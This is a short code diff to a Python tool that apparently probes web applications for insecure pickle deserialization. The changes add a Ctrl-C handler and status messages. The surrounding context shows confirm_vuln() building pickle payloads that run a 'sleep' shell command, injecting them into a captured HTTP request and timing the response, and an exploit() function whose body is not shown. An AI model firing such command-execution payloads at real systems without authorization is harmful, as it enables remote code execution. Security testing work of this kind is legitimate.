@@ -8,6 +8,7 @@ import pickletools
 import time
 import sys
 import math
+import signal
 
 import requests
 from requests import Request
@@ -288,6 +289,7 @@ def confirm_vuln():
     # list of payloads(different pickle protocol)
     payloads_list = generate_payload(f"sleep {sleep_time}")
 
+    print("[+] Testing ...")
     for payload in payloads_list:
         (method, url, headers, data) = parse_request_and_insert_payload(req_lines=request, payload=payload, custom_marker=g_args.marker, http=g_args.http)
         req = Request(method=method, url=url, headers=headers, data=data)
@@ -313,7 +315,9 @@ def confirm_vuln():
                 print_green("\n[+] Tested web application is vulnerable!!!") 
                 print_green(f"[+] Payload causing sleep {sleep_time}: {payload}")
                 print()
+                return
 
+    print_red("[+] The app seems to not be vulnerable")
 
     #todo: test with some prepickled sleep/timeout payloads
 
@@ -405,7 +409,9 @@ def exploit():
 
 
     
-
+def sig_handler(sig, frame):
+    print_red("[+] Caught Ctrl-c. Exiting...\n")
+    exit(1)
 
 
 def check_py_version():
@@ -428,7 +434,11 @@ def print_red(txt):
 
 if __name__ == '__main__':
 
+
+    signal.signal(signal.SIGINT, sig_handler)
     print_banner()
     check_py_version()
     parse_args()
+
+
 
